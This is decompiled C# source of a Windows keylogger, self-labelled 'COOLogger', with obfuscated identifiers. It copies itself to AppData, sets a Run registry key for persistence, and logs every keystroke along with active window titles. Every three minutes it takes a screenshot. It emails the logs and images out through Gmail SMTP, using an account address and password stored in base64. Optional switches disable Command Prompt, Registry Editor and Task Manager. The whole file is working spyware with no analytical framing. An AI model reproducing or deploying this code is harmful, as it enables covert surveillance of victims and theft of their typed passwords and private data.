using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class dVuJCmUWqTYlwRe
{
	private static string SEfCBcKbNRrSdXp = "eW91cm1vdGhlcmludGhlYnVtQGdtYWlsLmNvbQ==";

	private static string mJfEvrDUjFsCZUx = "cG9vZnVjazg=";

	private static string zgzGODirsqvTZgL = "smtp.gmail.com";

	private static int mlCFIzYngQyBVxC = 587;

	private static string VuJCmUWqTYlwReS;

	private static string EfCBcKbNRrSdXpm;

	private static string JfEvrDUjFsCZUxz;

	private static string gzGODirsqvTZgLY;

	private static string XnrtlLaSDkmHjoD;

	private static string wmSbcafQJQuIHXa;

	private static int vHBTDZJUaWhyNVW = 180000;

	private static string cyMaIZLPodaUmjG = null;

	private static object QNvJiiKSeHaGevW = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string gEycdKQjrhNIJHM = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage wELbDCSIKCbEigP = new MailMessage();

	private static SmtpClient UzjfUoeVjtccPCc = new SmtpClient();

	[AccessedThroughProperty("lVRGaRIVfPOCnPl")]
	private static yMaIZLPodaUmjGc _lVRGaRIVfPOCnPl;

	private static object oBETopyJEhwPjDw = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox rUzjfUoeVjtccPC = new RichTextBox();

	private static yMaIZLPodaUmjGc lVRGaRIVfPOCnPl
	{
		get
		{
			return _lVRGaRIVfPOCnPl;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lVRGaRIVfPOCnPl != null)
			{
				yMaIZLPodaUmjGc.KeyDown -= orjIXQzhkFhlzKf;
			}
			_lVRGaRIVfPOCnPl = value;
			if (_lVRGaRIVfPOCnPl != null)
			{
				yMaIZLPodaUmjGc.KeyDown += orjIXQzhkFhlzKf;
			}
		}
	} = new yMaIZLPodaUmjGc();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cb: Expected O, but got Unknown
		//IL_02ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f4: Expected O, but got Unknown
		wmSbcafQJQuIHXa = Conversions.ToString(true);
		JfEvrDUjFsCZUxz = Conversions.ToString(false);
		gzGODirsqvTZgLY = Conversions.ToString(false);
		XnrtlLaSDkmHjoD = Conversions.ToString(false);
		EfCBcKbNRrSdXpm = Conversions.ToString(false);
		VuJCmUWqTYlwReS = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, QNvJiiKSeHaGevW, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(QNvJiiKSeHaGevW, (object)"\\qxOonEtwoNqVTBp.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(gEycdKQjrhNIJHM + "\\qxOonEtwoNqVTBp.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(QNvJiiKSeHaGevW, (object)"\\"), oBETopyJEhwPjDw))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(QNvJiiKSeHaGevW, (object)"\\"), oBETopyJEhwPjDw)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(QNvJiiKSeHaGevW, (object)"\\"), oBETopyJEhwPjDw)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(QNvJiiKSeHaGevW, (object)"\\"), oBETopyJEhwPjDw)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(QNvJiiKSeHaGevW, (object)"\\"), oBETopyJEhwPjDw) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(VuJCmUWqTYlwReS))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(oBETopyJEhwPjDw)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(oBETopyJEhwPjDw), Operators.ConcatenateObject(Operators.ConcatenateObject(QNvJiiKSeHaGevW, (object)"\\"), oBETopyJEhwPjDw));
			}
		}
		if (Conversions.ToBoolean(EfCBcKbNRrSdXpm))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(QNvJiiKSeHaGevW, (object)"\\qxOonEtwoNqVTBp.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(JfEvrDUjFsCZUxz))
		{
			Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(gzGODirsqvTZgLY))
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(XnrtlLaSDkmHjoD))
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(180000);
		val.add_Tick((EventHandler)xMtLwBbPNHZWsOm_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)soBETopyJEhwPjD_Ticked);
		val2.Start();
		lVRGaRIVfPOCnPl.BHDOSgCENWRuLdx();
		Application.Run();
	}

	private static string CXZiGnRgNTmukQL()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string sfStQOqYpbfFfqk(string ZmlCFIzYngQyBVx)
	{
		byte[] bytes = Convert.FromBase64String(ZmlCFIzYngQyBVx);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void xMtLwBbPNHZWsOm_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(wmSbcafQJQuIHXa))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = xRLBgppnseXeJVV(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(QNvJiiKSeHaGevW, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(QNvJiiKSeHaGevW, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(sfStQOqYpbfFfqk(SEfCBcKbNRrSdXp));
				mailMessage.To.Add(sfStQOqYpbfFfqk(SEfCBcKbNRrSdXp));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = rUzjfUoeVjtccPC.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(sfStQOqYpbfFfqk(SEfCBcKbNRrSdXp), sfStQOqYpbfFfqk(mJfEvrDUjFsCZUx));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				rUzjfUoeVjtccPC.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage mailMessage2 = wELbDCSIKCbEigP;
		mailMessage2.From = new MailAddress(sfStQOqYpbfFfqk(SEfCBcKbNRrSdXp));
		mailMessage2.To.Add(sfStQOqYpbfFfqk(SEfCBcKbNRrSdXp));
		mailMessage2.Subject = "COOLogger Logs from - " + Environment.UserName;
		mailMessage2.Body = rUzjfUoeVjtccPC.get_Text();
		mailMessage2 = null;
		SmtpClient uzjfUoeVjtccPCc = UzjfUoeVjtccPCc;
		uzjfUoeVjtccPCc.Host = "smtp.gmail.com";
		uzjfUoeVjtccPCc.Port = 587;
		uzjfUoeVjtccPCc.EnableSsl = true;
		uzjfUoeVjtccPCc.Credentials = new NetworkCredential(sfStQOqYpbfFfqk(SEfCBcKbNRrSdXp), sfStQOqYpbfFfqk(mJfEvrDUjFsCZUx));
		uzjfUoeVjtccPCc.Send(wELbDCSIKCbEigP);
		uzjfUoeVjtccPCc = null;
		rUzjfUoeVjtccPC.set_Text("");
	}

	public static void orjIXQzhkFhlzKf(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox val = rUzjfUoeVjtccPC;
		val.set_Text(val.get_Text() + lVRGaRIVfPOCnPl.RLBgppnseXeJVVk(e));
	}

	public static void soBETopyJEhwPjD_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(cyMaIZLPodaUmjG, CXZiGnRgNTmukQL(), false) != 0)
		{
			cyMaIZLPodaUmjG = CXZiGnRgNTmukQL();
			if (Operators.CompareString(cyMaIZLPodaUmjG, "", false) != 0)
			{
				RichTextBox val = rUzjfUoeVjtccPC;
				val.set_Text(val.get_Text() + "\r\n\r\n~~~~~" + cyMaIZLPodaUmjG + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string xRLBgppnseXeJVV(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
